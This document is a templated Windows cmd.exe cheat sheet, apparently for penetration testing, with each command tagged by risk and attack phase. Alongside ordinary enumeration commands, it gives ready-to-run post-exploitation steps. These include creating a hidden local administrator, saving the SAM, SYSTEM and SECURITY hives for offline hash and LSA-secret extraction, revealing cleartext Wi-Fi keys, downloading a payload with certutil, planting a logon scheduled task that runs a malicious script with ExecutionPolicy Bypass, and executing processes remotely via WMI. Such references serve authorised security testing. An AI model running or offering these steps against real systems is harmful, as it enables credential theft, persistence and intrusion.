# Windows CMD

> Native cmd.exe utilities and Win32 exes: net, ipconfig, netstat, arp, route, netsh, wmic, schtasks, reg, cmdkey, cipher, certutil, where, set/setx, systeminfo. Run from a cmd shell (or `cmd /c` inside PowerShell).

<!-- tags: windows, cmd, cli, post, enum -->

---

## current user windows
Show the current user, domain, and machine name.

```bash
whoami /all && hostname
```

<!-- meta: risk=safe | phase=enum | tags=whoami,hostname,context -->

---

## system info windows
Display detailed configuration including hotfixes and architecture.

```bash
systeminfo
```

<!-- meta: risk=safe | phase=enum | tags=systeminfo,build,patches -->

---

## os version windows
Quickly extract OS name and version from systeminfo.

```bash
systeminfo | findstr /B /C:"OS Name" /C:"OS Version"
```

<!-- meta: risk=safe | phase=enum | tags=systeminfo,os,version -->

---

## list users windows
Show all local user accounts.

```bash
net user
```

<!-- meta: risk=safe | phase=enum | tags=net,user,local -->

---

## show user details windows
Show details, group membership, and last logon for a user.

```bash
net user {{USERNAME:str}}
```

<!-- meta: risk=safe | phase=enum | tags=net,user,details -->

---

## add admin user windows
Create a new user and add to the local Administrators group.

```bash
net user {{USERNAME:str:backup}} {{PASSWORD:str:Password123!}} /add && net localgroup administrators {{USERNAME:str:backup}} /add
```

<!-- meta: risk=high | phase=post | tags=persistence,admin,user -->

---

## ipconfig network windows
Show TCP/IP configuration including DNS and IPv6.

```bash
ipconfig /all
```

<!-- meta: risk=safe | phase=enum | tags=ipconfig,network,dns -->

---

## list connections windows netstat
Show TCP/UDP connections, listening ports, and PIDs.

```bash
netstat -ano
```

<!-- meta: risk=safe | phase=enum | tags=netstat,connections,pid -->

---

## arp cache windows
Display the local ARP table.

```bash
arp -a
```

<!-- meta: risk=safe | phase=enum | tags=arp,table,layer2 -->

---

## routing table windows
Print the local routing table.

```bash
route print
```

<!-- meta: risk=safe | phase=enum | tags=route,routing,table -->

---

## list wifi profiles windows
List saved Wi-Fi profiles on the host.

```bash
netsh wlan show profiles
```

<!-- meta: risk=safe | phase=enum | tags=wifi,profiles,wlan -->

---

## reveal wifi password windows
Display the cleartext key for a saved Wi-Fi profile.

```bash
netsh wlan show profile name="{{PROFILE:str}}" key=clear
```

<!-- meta: risk=med | phase=post | tags=wifi,password,clear -->

---

## list hotfixes windows
Enumerate installed Windows updates and KB numbers.

```bash
wmic qfe get Caption,Description,HotFixID,InstalledOn
```

<!-- meta: risk=safe | phase=enum | tags=wmic,hotfix,patches -->

---

## list scheduled tasks windows
Print all scheduled tasks with full detail.

```bash
schtasks /query /fo LIST /v
```

<!-- meta: risk=safe | phase=enum | tags=schtasks,persistence,tasks -->

---

## search registry password windows
Recursively search HKLM for the string "password".

```bash
reg query {{HIVE:str:HKLM}} /f "{{PATTERN:str:password}}" /t REG_SZ /s
```

<!-- meta: risk=low | phase=post | tags=registry,password,search -->

---

## dump sam system hives windows
Save SAM and SYSTEM registry hives for offline cred extraction.

```bash
reg save HKLM\SAM {{SAM:file:sam.hive}} && reg save HKLM\SYSTEM {{SYSTEM:file:system.hive}}
```

<!-- meta: risk=high | phase=post | tags=sam,system,offline,hashes -->

---

## dump security hive windows
Save the SECURITY hive for LSA secret extraction.

```bash
reg save HKLM\SECURITY {{SEC:file:security.hive}}
```

<!-- meta: risk=high | phase=post | tags=security,lsa,offline -->

---

## list stored creds windows cmdkey
Show usernames and credential targets stored in Windows Credential Manager.

```bash
cmdkey /list
```

<!-- meta: risk=low | phase=post | tags=cmdkey,creds,vault -->

---

## find encrypted files windows
Locate EFS-encrypted files on local drives.

```bash
cipher /u /n
```

<!-- meta: risk=safe | phase=post | tags=cipher,efs,encrypted -->

---

## download file windows certutil
Use certutil to download a payload (off-by-default URL cache).

```bash
certutil -urlcache -split -f {{URL:url}} {{OUTFILE:file:C:\\Users\\Public\\payload.exe}}
```

<!-- meta: risk=med | phase=post | tags=certutil,download,lolbin -->

---

## persist schtask logon windows
Create a scheduled task that runs a payload at user logon.

```bash
schtasks /create /tn "{{NAME:str:Updater}}" /tr "powershell.exe -ExecutionPolicy Bypass -File {{PAYLOAD:file:C:\\malicious.ps1}}" /sc onlogon
```

<!-- meta: risk=high | phase=post | tags=schtasks,persistence,logon -->

---

## exec remote wmi windows
Spawn a process on a remote host via WMI.

```bash
wmic /node:{{TARGET:ip}} /user:{{USERNAME:str}} /password:{{PASSWORD:str}} process call create "{{CMD:str:cmd.exe /c whoami}}"
```

<!-- meta: risk=high | phase=exploit | tags=wmic,remote,exec -->

---

## add registry key or value
Create or set a registry value (persistence or config tampering).

```bash
reg add "{{KEYPATH:str}}" /v {{VALUE:str}} /t REG_SZ /d "{{DATA:str}}" /f
```

<!-- meta: risk=med | phase=post | tags=registry,reg,persistence,windows -->

---

## enable winrm windows
Configure and start the WinRM listener on the local host.

```bash
winrm quickconfig
```

<!-- meta: risk=med | phase=post | tags=winrm,quickconfig,remoting -->

---

## find file by name windows
Recursively locate a file by name from the drive root.

```bash
where /R C:\ {{FILE:str:file.txt}}
```

<!-- meta: risk=low | phase=enum | tags=where,file,search -->

---

## list environment variables windows
Print all current environment variables for the session.

```bash
set
```

<!-- meta: risk=low | phase=enum | tags=env,variables,set -->

---

## set environment variable windows
Set a persistent (global) environment variable with setx, or a session variable with set.

```bash
setx {{VAR:str:PATH}} {{DATA:str:value}}
```

<!-- meta: risk=med | phase=post | tags=env,setx,persistent -->

---

## set session variable windows
Set an environment variable for the current shell session only.

```bash
set {{VAR:str:PATH}}={{DATA:str:value}}
```

<!-- meta: risk=low | phase=misc | tags=env,set,session -->

---

## delete environment variable windows
Delete a persistent (global) environment variable by setting it empty with setx.

```bash
setx {{VAR:str:PATH}} ""
```

<!-- meta: risk=med | phase=post | tags=env,setx,delete -->

---

## list shares net share
Enumerate the local SMB shares exposed by the host.

```bash
net share
```

<!-- meta: risk=low | phase=enum | tags=net,share,smb -->

---

## list domain resources net view
Enumerate machines in the domain, or shares on a specific host.

```bash
net view && net view \\{{COMPUTER:str:DC01}}
```

<!-- meta: risk=low | phase=enum | tags=net,view,smb,shares -->
